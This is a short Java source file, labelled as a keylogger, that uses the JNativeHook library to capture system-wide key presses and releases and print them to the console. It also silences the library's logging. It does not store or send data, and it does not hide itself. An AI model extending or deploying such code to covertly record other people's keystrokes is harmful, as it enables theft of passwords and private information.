package keylogger;

import java.util.logging.Level;
import java.util.logging.Logger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;


public class KeyListener implements NativeKeyListener{

	public static void main(String[] args) {

		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException e) {
			e.printStackTrace();
		}

		GlobalScreen.addNativeKeyListener(new KeyListener());
		
		Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
		
		logger.setLevel(Level.OFF);
	}

	@Override
	public void nativeKeyPressed(NativeKeyEvent arg0) {
		System.out.println("Pressed: " + NativeKeyEvent.getKeyText(arg0.getKeyCode()));		
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent arg0) {
		System.out.println("Released: " + NativeKeyEvent.getKeyText(arg0.getKeyCode()));
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent arg0) {
	}
}
